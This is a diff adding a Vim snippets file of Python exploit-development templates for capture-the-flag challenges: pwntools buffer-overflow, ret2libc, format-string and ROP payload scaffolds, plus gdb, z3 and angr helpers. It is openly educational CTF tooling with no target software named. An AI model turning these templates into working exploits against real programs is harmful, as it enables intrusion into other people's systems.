@@ -1,0 +1,243 @@
+## PWNTOOLS ##
+
+snippet pimp "pwn imports"
+	from pwn import *
+
+
+
+# modded from https://github.com/minight/dotfiles/blob/master/config/nvim/UltiSnips/python.snippets
+snippet pwn "general pwntools template"
+	from pwn import *
+	#context.log_level = 'debug'
+	
+	log.info("Iniciando el hackeo.")
+
+	remoteflag = 0
+	IP = ''
+	PORT = 6005
+	FILENAME = "${1:pwnme}"
+	if remoteflag:
+		io = remote(IP, PORT)
+	else:
+		io = process(FILENAME) # for more args, make a list [FILENAME, a, b, ...]
+	
+	# Dump symbols
+	elf = ELF(FILENAME)
+	import json
+	print json.dumps({k:hex(v) for k,v in elf.symbols.items()}, indent=4)
+	# radare can probably pull out more, this just shows you what pwntools can see
+
+	payload = cyclic(100)
+	payload += pack(0x41414141)
+	
+	#io.interactive()
+	io.sendline(payload)
+	print io.recvall()
+
+# modded from https://github.com/Naetw/CTF-pwn-tips#find-binsh-or-sh-in-library
+# Note: you'll have to find the base yourself
+# For a local binary without aslr, you can do sth like this:
+# ./asdf & sleep 0.01; pwnme=`pidof ./asdf`; cat /proc/$pwnme/maps; kill -9 $pwnme
+# Else you'll need to leak a libc addr (eg. via puts/write or fsb) or use bestforce (if on 32 bit)
+# HOWEVER, if the binary is statically linked (ie there is no libc code) then you need ROP
+snippet ret2libc "prepping ret2libc payload fodder"
+
+	libc = ELF('${1:libc.so}')
+	base = #leak_addr - libc.sym.
+
+	sys_off = libc.symbols['system']
+	sys = base + sys_off
+	sh = base + next(libc.search('sh\x00'))
+	binsh = base + next(libc.search('/bin/sh\x00'))
+
+# https://github.com/tnballo/notebook/wiki/Pwntools-Snippets#generate-a-format-string-exploit-for-arbitrary-write
+# Uses a linear search for the offset, so might not be great if the offset is very large, but otherwise this is M A G I C
+snippet fmt "automatic fsb exploit generation"
+	from pwn import *
+
+	VAL_TO_WRITE = ${1:0x8048618}
+	ADDR = ${2:0x8049868}
+
+	# Wrapper for vuln binary
+	def exec_fmt(payload):
+		 io = process('./${3:vuln_binary}')
+		 io.sendline(payload)
+		 return io.recvall()
+
+	# Construct payload
+	context.clear(arch = '${4:i386 | amd64}') 
+	# full list: docs.pwntools.com/en/stable/context.html#pwnlib.context.ContextType.architectures
+	payload = fmtstr_payload(FmtStr(exec_fmt).offset, 
+									{ADDR: VAL_TO_WRITE}, 
+									numbwritten=0, 
+									write_size='byte')
+
+#snippet rop "https://github.com/ctfhacker/ctf-writeups/blob/master/campctf-2015/bitterman-pwn-400/README.md"
+#	from pwn import *
+#
+#	elf = ELF('./${1:vuln_binary}')
+#	rop = ROP(elf)
+#
+#	rop.puts(elf.got['puts'])
+#	rop.call(elf.symbols['main'])
+#
+#	print rop.dump()
+#
+
+# https://bytesoverbombs.io/quickie-pwntools-414bb89ef83f
+snippet rop "rop template. This one doesn't use the rop module"
+	from pwn import *
+
+	# Create the ELF object
+	elf = ELF("${1:callme32}")
+
+	# Find the memory addresses for relevant functions and pack them
+	${2:callme_one}   = p32(elf.symbols["$2"])
+	${3:callme_two}   = p32(elf.symbols["$3"])
+	${4:callme_three} = p32(elf.symbols["$4"])
+
+	# Pack the address for the gadget we plan to leverage
+	poppoppop    = p32(${5:0x0804beef})
+
+	# Pack the arguments for the functions we want to call
+	args         = p32(1) + p32(2) + p32(3)
+
+	# Build the payload
+	payload = "A" * 44
+	payload += $2 + poppoppop + args
+	payload += $3 + poppoppop + args
+	payload += $4 + poppoppop + args
+	# Execute our application with our buffer overflow string
+	io = elf.process()
+	io.sendline(payload)
+	io.interactive()
+
+# Reasons you might do this: PLT & GOT are fixed, so you can use it to call libc functions without knowing where libc starts in the binary
+# note: .symbols['got.foo'] == .got['foo'] == .got.foo
+snippet gota "get address of an entry in the GOT"
+	#target_binary = ELF('./${1:vuln_binary}')
+	${2:funcname}_got_addr = target_binary.got['$2']
+	#$2_got_val = unpack(target_binary.read($2_got_addr, 4))
+
+snippet funa "get address of a function, eg system()"
+	#target_binary = ELF('./${1:vuln_binary}')
+	${2:funcname}_addr = target_binary.symbols['$2']
+
+# Can be used to quickly calculate bof lengths without static analysis
+# However, I've since made a zsh alias that rolls both of these (cyc,cyf) into one command
+snippet cyc "generate cyclic(de Bruijn) sequence"
+	cyclic(${1:100}, n=4)
+
+snippet cyf "given a subsequence from cyclic, calculate the offset"
+	cyclic_find(${1:0xdeadbeef})
+
+snippet ln
+	log.info(${0:msg})
+
+snippet gdb
+	gdb.attach(io)
+
+# modded from https://github.com/tnballo/notebook/wiki/Pwntools-Snippets
+# and https://youtu.be/gWU2yOu0COk?t=1m
+# The second source separates out the gdbscript into a separate line (which I did not do here)
+# WARNING: both of these are likely to interfere with io, gdb.attach(io) is the safest option
+# They will also not work on a remote host
+# Consider context.log_level = 'debug' as an alternative
+snippet gdbm "gdb, break on main"
+	gdb.attach(io, '''
+		break *{}
+		continue
+		'''.format(elf.symbols['main']),
+		# ^this assumes that a symbol called 'main' exists
+		gdb_args=['-q'])
+
+snippet gdbe "gdb, break on entry point. Requires pwndbg"
+	gdb.attach(io, '''
+		entry
+		continue
+		''',
+		gdb_args=['-q'])
+
+## Z3 ##
+
+# modded from https://www.youtube.com/watch?v=b92CW-NZ3l0
+snippet math "2+2 is 4, minus 1 that's 3 quick í´¥mathsí´¥"
+	from z3 import *
+
+	s = Solver()
+
+	# Rules or some shit
+	# eg. solve for x
+	x = BitVec('x', 64)
+	s.add(${1: Insert maths, eg. x * b == c})
+
+	# Print model
+	if s.check() == sat:
+		m = s.model()
+		print m
+		#print hex(int(str(m[x]))) #can also use sexpr() but it's ugly
+		#print p64(int(str(m[x]))) #needs pwntools
+
+## ANGR ##
+
+snippet angr
+	import angr
+	import claripy
+
+	p = angr.Project('./${1:binary_name}',  load_options={"auto_load_libs": False})
+
+	# You can replace these with concrete values if you already know them
+	# Sizes are measured in bits, and are upper bounds
+	arg1 = claripy.BVS('lolfuk', 8 * 40)
+
+	# Generate initial state
+	st = p.factory.entry_state(args=['./$1', arg1])
+	#st = p.factory.blank_state(addr=0x400c6c)
+	#st.memory.store(0xffffffff, arg1)
+	#st.regs.rdi = 0xffffffff
+
+	# Create a path group and explore it
+	pg = p.factory.path_group(st)
+	#pg.explore(find=lambda p: "WIN" in p.state.posix.dumps(1))
+	pg.explore(find=[0x400e93], avoid=[])
+
+	print "pg = {}".format(pg)
+	if (len(pg.found) > 0):
+		 s = pg.found[0].state
+		 print "Found a solution:"
+		 # Find concrete values that satisfy the constraints
+		 print "arg1 = {} ".format(repr(s.se.any_str(arg1)))
+		 print s.posix.dumps(0).split('\0')[0] # this tends to work for simpler challs
+	else:
+	 	 print "fuckkkkkkk"
+
+
+#	import angr
+#
+#	def main():
+#		p = angr.Project('./${1:binary_name}', load_options={"auto_load_libs": False})
+#		pg = p.factory.path_group()
+#
+#		pg.explore(find=(${2:0x31333337},), avoid=(${3:0xdeadbeef},${4:0x8badf00d},))
+#
+#		found = pg.found[0]
+#		return found.state.posix.dumps(0).split('\0')[0]
+#
+#	if __name__ == '__main__':
+#		print(main())
+
+snippet angrop 
+	import angr
+	import angrop
+
+	p = angr.Project("./${1:binary_name}")
+	rop = p.analyses.ROP()
+	rop.find_gadgets()
+
+	# Choose your weapon:
+	chain = rop.set_regs(rax=0x1337, rbx=0x56565656)
+	#chain = rop.write_to_mem(0x61b100, "/bin/sh\0")
+	#chain = rop.func_call("read", [0, 0x804f000, 0x100])
+	#chain = rop.add_to_mem(0x804f124, 0x41414141)
+
+	chain.print_payload_code()
